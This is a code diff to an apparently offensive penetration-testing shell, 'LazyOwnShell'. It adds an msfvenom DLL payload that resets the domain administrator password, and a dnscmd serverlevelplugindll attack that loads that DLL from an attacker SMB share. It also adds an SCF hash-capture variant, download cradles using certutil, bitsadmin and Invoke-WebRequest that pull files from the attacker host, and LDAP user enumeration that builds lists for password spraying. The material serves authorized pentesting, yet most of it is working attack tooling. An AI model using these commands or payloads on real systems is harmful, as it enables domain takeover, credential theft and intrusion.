@@ -1748,7 +1748,8 @@ class LazyOwnShell(Cmd):
         print_msg("15: android/meterpreter/reverse_tcp")
         print_msg("16: java/jsp_shell_reverse_tcp")
         print_msg("17: windows/meterpreter/reverse_tcp  (C - shikata_ga_nai)")
-        choice = input("Enter your choice (1-17): ").strip()
+        print_msg("18: windows/x64/exec cmd='net user administrator P@s5w0rd123!'")
+        choice = input("Enter your choice (1-18): ").strip()
 
         # Define payload commands
         commands = {
@@ -1775,12 +1776,13 @@ class LazyOwnShell(Cmd):
             "16": f'msfvenom -p java/jsp_shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -o sessions/shell.jsp ',
             "17": (
                 f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
+            ),
+            "18": (
+                "msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll"
             )
         }
 
-        # Check if the choice is valid
         if choice in commands:
-            # Execute the chosen command
             if choice == '14':
                 os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > sessions/shell.exe')
                 print_warn("esperando payload shell.exe ")
@@ -1801,17 +1803,12 @@ class LazyOwnShell(Cmd):
                     os.system("sudo apt-get install zipalign")
                 os.system("zipalign -v 4 sessions/shell.apk sessions/signed_shell.apk")
 
-            # Move and set permissions for the generated payload
             if choice in commands:
                 os.system("mkdir -p sessions")
-                os.system(
-                    "mv shell* sessions 2>/dev/null"
-                )  # Move files and suppress errors if no files match
+                os.system("mv shell* sessions 2>/dev/null")
+                os.system("mv da.dll sessions 2>/dev/null")
                 os.system("chmod +x sessions/shell*")
-
             print_msg("Payloads moved to sessions/")
-
-            # Apply UPX to compress the payloads if applicable
             if choice in ["1", "2", "7", "8"]:
                 if os.path.exists("sessions/shell.elf"):
                     os.system("upx sessions/shell.elf")
@@ -1830,7 +1827,6 @@ class LazyOwnShell(Cmd):
                 if os.path.exists("sessions/shell64.macho"):
                     os.system("upx sessions/shell64.macho")
             if choice == "13":
-                # Handle the payload in C (shikata_ga_nai)
                 if os.path.exists("payload.c"):
                     print_msg("Payload in C generated: payload.c")
                     os.system(
@@ -3543,7 +3539,7 @@ class LazyOwnShell(Cmd):
         Usage:
             smbserver
 
-        :param line: Command parameters (not used in this function).
+        :param line: Command parameters folder name (optional).
         :type line: str
 
         - Checks if `lhost` is valid using the `check_lhost` function.
@@ -3571,27 +3567,42 @@ class LazyOwnShell(Cmd):
             - The SCF file is used to create a shortcut to the SMB share and should be accessible from the target system.
             - Ensure that the `lhost` parameter is correctly set and that the SMB server is properly configured.
         """
-
+        if line:
+            folder = line
+        else:
+            folder = 'smbfolder'
         lhost = self.params["lhost"]
         if not check_lhost(lhost):
             return
-        revshell = f"""[Shell]
-        Command=2
-        IconFile=\\\\\\\\{lhost}\\smbfolder\\icon.ico
-        [Taskbar]
-        Command=ToggleDesktop
-        """.replace("        ", "")
-        print_msg(f"Try... echo '{revshell}' > sessions/file.scf ")
-        os.system(f"echo '{revshell}' > sessions/file.scf ")
-        print_msg(f"echo 'curl http://{lhost}/sessions/file.scf' |  xclip -sel clip")
-        print_msg(f"command copied to clipboard")
-        print_msg(f"trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
-        os.system(
-            f"echo 'curl http://{lhost}/sessions/file.scf -o file.scf' |  xclip -sel clip"
-        )
-        os.system(
-            "cd sessions && sudo impacket-smbserver smbfolder $(pwd) -smb2support"
-        )
+        choice = input(f"    [!] Enter your choice {GREEN}1) {WHITE}to file.scf attack or {GREEN}2){WHITE} to dnscmd dll attack (default: 2)") or '2'
+        if choice == '1':
+            #TODO: Refactor
+            revshell = f"""[Shell]
+            Command=2
+            IconFile=\\\\\\\\{lhost}\\{folder}\\icon.ico
+            [Taskbar]
+            Command=ToggleDesktop
+            """.replace("        ", "")
+            print_msg(f"Try... echo '{revshell}' > sessions/file.scf ")
+            os.system(f"echo '{revshell}' > sessions/file.scf ")
+            print_msg(f"echo 'curl http://{lhost}/file.scf' |  xclip -sel clip")
+            print_msg(f"command copied to clipboard")
+            print_msg(f"trying sudo impacket-smbserver {folder} $(pwd) -smb2support ...")
+            os.system(
+                f"echo 'curl http://{lhost}/file.scf -o file.scf' |  xclip -sel clip"
+            )
+            os.system(
+                f"cd sessions && sudo impacket-smbserver {folder} $(pwd) -smb2support"
+            )
+        elif choice == '2':
+            lhost = self.params["lhost"]
+            command = f"cd sessions && sudo impacket-smbserver {folder} $(pwd) -smb2support"
+            print_msg(command)
+            attack = f'cmd /c dnscmd localhost /config /serverlevelplugindll \\{lhost}\{folder}\da.dll'
+            copy2clip(attack)
+            os.system(command)
+        else:
+            print_error("wrong choice (1/2)")
         return
 
     def do_sqlmap(self, line):
@@ -12060,7 +12071,7 @@ class LazyOwnShell(Cmd):
                 pass  # Create the file
 
         print_msg(f"Opening {users_file_path} with nano for editing.")
-        os.system(f"nano {users_file_path}")
+        os.system(f"nano {users_file_path} -l")
 
         return
 
@@ -12075,7 +12086,7 @@ class LazyOwnShell(Cmd):
         :param line: Not used in this implementation.
         :returns: None
         """
-        if not is_binary_present("windapsearch"):
+        if not is_binary_present("go-windapsearch"):
             print_warn("windapsearch binary not found. Installing...")
             print_msg("Choose installation method for windapsearch:")
             print_msg("1. Download pre-compiled binaries (Linux amd64)")
@@ -12136,8 +12147,10 @@ class LazyOwnShell(Cmd):
                             username = line
                         password = params[1].replace("\n", "")
         else:            
-            command = f"go-windapsearch --dc {rhost} --full -m users -o sessions/{rhost}_windap -j y -v y"
+            command = f"go-windapsearch --dc {rhost} --full -m users -o sessions/{rhost}_windap.json -j y -v y"
             os.system(command)
+            os.system(f"cat sessions/{rhost}_windap.json | jq")
+            self.do_windapsearchscrapeusers(f'sessions/{rhost}_windap.json')
             return
 
         use_ntlm = input("    [!] Use NTLM auth? (y/n, default: n): ").strip().lower() or 'n'
@@ -12146,7 +12159,7 @@ class LazyOwnShell(Cmd):
         use_ldaps = input("    [!] Use LDAPS? (y/n, default: n): ").strip().lower() or 'n'
         ldaps_command = "--secure" if use_ldaps == 'y' else ""
         
-        output_file = input("    [!] Enter the output file (optional): ").strip() or f"sessions/{domain}_windap"
+        output_file = input("    [!] Enter the output file (optional): ").strip() or f"sessions/{domain}_windap.json"
         output_command = f"-o {output_file}" if output_file else ""
         
         json_output = input("    [!] Output in JSON format? (y/n, default: n): ").strip().lower() or 'n'
@@ -12169,6 +12182,8 @@ class LazyOwnShell(Cmd):
         
         print_msg(f"Generated command: {command}")
         os.system(command)
+        os.system(f"cat {output_file} | jq")
+        self.do_windapsearchscrapeusers(output_file)
         return
 
     def do_passtightvnc(self, line):
@@ -12361,6 +12376,162 @@ class LazyOwnShell(Cmd):
             os.system(command)
         return
         
+    def do_windapsearchscrapeusers(self, line):
+        """
+        Extracts usernames from a JSON output generated by go-windapsearch and appends them
+        to the file sessions/users.txt.
+
+        The function loads the JSON file, parses the `sAMAccountName` attribute for each user, and appends
+        the username to the sessions/users.txt file.
+
+        :param line: Path to the JSON file (e.g., 'sessions/<dc_ip>_windap.json').
+        :returns: None
+        """
+        json_file = line.strip()
+
+        if not os.path.exists(json_file):
+            print_error(f"Error: El archivo {json_file} no existe.")
+            return
+
+        try:
+            with open(json_file, 'r') as f:
+                data = json.load(f)
+            
+            user_file = "sessions/users.txt"
+            with open(user_file, 'a') as uf:
+                for entry in data:
+                    if 'sAMAccountName' in entry:
+                        uf.write(entry['sAMAccountName'] + '\n')
+                        print_msg(f"Agregado usuario: {entry['sAMAccountName']}")
+            
+            print_msg(f"Todos los usuarios se han agregado a {user_file}.")
+        
+        except json.JSONDecodeError:
+            print_error(f"Error: No se pudo decodificar el archivo {json_file}. Asegúrate de que sea un JSON válido.")
+        except Exception as e:
+            print_error(f"Error: {str(e)}")        
+
+
+    def do_downloader(self, line):
+        """
+        Generate a downloader command for files in the sessions directory.
+
+        This function lists all files in the 'sessions' directory recursively, excluding certain file extensions.
+        The user can select a file, choose a download method, and the command is generated and copied to the clipboard.
+
+        :param line: Optional output filename for the downloader command.
+        :returns: None
+        """
+        excluded_extensions = ['.html', '.xml', '.nmap', '.dot', '.png', '.xsl', '.txt', '.json']
+        file_list = []
+        for root, dirs, files in os.walk("sessions"):
+            for file in files:
+                if not any(file.endswith(ext) for ext in excluded_extensions):
+                    file_list.append(os.path.join(root, file))
+        
+        if not file_list:
+            print_error("No files found in the sessions directory.")
+            return
+  
+        print_msg("Select a file to download:")
+        for idx, file in enumerate(file_list, 1):
+            print_msg(f"  {idx}) {file}")
+
+        file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()
+        
+        try:
+            file_choice = int(file_choice)
+            if file_choice < 1 or file_choice > len(file_list):
+                print_warn("Invalid choice.")
+                return
+            selected_file = file_list[file_choice - 1]
+        except ValueError:
+            print_error("Invalid input. Please enter a number.")
+            return
+        
+        
+        print_msg("Select the download method:")
+        methods = [
+            "curl",
+            "wget",
+            "Invoke-WebRequest (IWR)",
+            "certutil.exe",
+            "bitsadmin.exe"
+        ]
+        for idx, method in enumerate(methods, 1):
+            print_warn(f"  {idx}) {method}")
+
+        method_choice = input(f"Enter the number of the download method (1-{len(methods)}): ").strip()
+
+        try:
+            method_choice = int(method_choice)
+            if method_choice < 1 or method_choice > len(methods):
+                print_warn("Invalid choice.")
+                return
+            selected_method = methods[method_choice - 1]
+        except ValueError:
+            print_error("Invalid input. Please enter a number.")
+            return
+
+        
+        lhost = self.params["lhost"]
+        
+        output_file = line.strip() if line else os.path.basename(selected_file)  
+        
+        command = ""
+        if selected_method == "curl":
+            command = f"curl -o {output_file} http://{lhost}/{selected_file}"
+        elif selected_method == "wget":
+            command = f"wget -O {output_file} http://{lhost}/{selected_file}"
+        elif selected_method == "Invoke-WebRequest (IWR)":
+            command = f"Invoke-WebRequest -Uri http://{lhost}/{selected_file} -OutFile {output_file}"
+        elif selected_method == "certutil.exe":
+            command = f"certutil.exe -urlcache -split -f http://{lhost}/{selected_file} {output_file}"
+        elif selected_method == "bitsadmin.exe":
+            command = f"bitsadmin.exe /transfer myDownloadJob http://{lhost}/{selected_file} {output_file}"
+        
+        command = command.replace("sessions/",'')
+        copy2clip(command)
+        print_msg(f"\nGenerated command copied to clipboard:\n{command}\n")
+
+    def do_ldapsearch(self, line):
+        """
+        Executes an LDAP search against a target remote host (rhost) and saves the results.
+
+        This function performs the following tasks:
+        1. Extracts the target remote host (rhost) from the class parameters.
+        2. Verifies if the rhost is valid using a custom `check_rhost` function.
+        3. Retrieves the domain information from the parameters.
+        4. Ensures that the 'ldapsearch' binary is available on the system. If it's missing, the function attempts to install it using the system's package manager (`apt`).
+        5. Constructs the LDAP search query based on the domain information, splitting the domain into components to form the correct base DN (Distinguished Name).
+        6. Runs the LDAP search with the following options:
+            - `-x`: Simple authentication (anonymous bind).
+            - `-H`: Specifies the LDAP server URL (using the rhost).
+            - `-b`: Specifies the search base (constructed from the domain).
+            - `-s sub`: Indicates the search scope, where 'sub' performs a subtree search.
+        7. Saves the result of the search to a log file under the 'sessions' directory, named based on the rhost.
+        8. Displays the log file content and checks for any 'lock' entries, which could indicate locked accounts or security incidents.
+        9. Extracts `userPrincipalName` attributes from the log, parses them, and appends the usernames (without domain) to a users.txt file for further analysis.
+
+        This function is useful in penetration testing engagements where LDAP enumeration is part of the reconnaissance phase. It automates LDAP queries and extracts useful user information, which could assist in credential harvesting, password spraying, or other user-based attacks.
+        """        
+        rhost = self.params["rhost"]
+        if not check_rhost(rhost):
+            return
+        domain = self.params["domain"]
+        if not is_binary_present("ldapsearch"):
+            print_warn("ldapsearch not found installing...")
+            os.system("sudo apt install ldapsearch -y")
+        log = f"sessions/ldapsearch_{rhost}.txt"
+        args = domain.split(".")
+        command = f"ldapsearch -x -H ldap://{rhost} -b 'dc={args[0]},dc={args[1]}' -s sub > {log}"
+        print_msg(command)
+        os.system(command)
+        os.system(f"cat {log}")
+        os.system(f"cat {log} | grep lock")
+        os.system(f"grep \"userPrincipalName\" {log} | cut -d' ' -f2 | cut -d'@' -f1 >> sessions/users.txt")
+        return
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
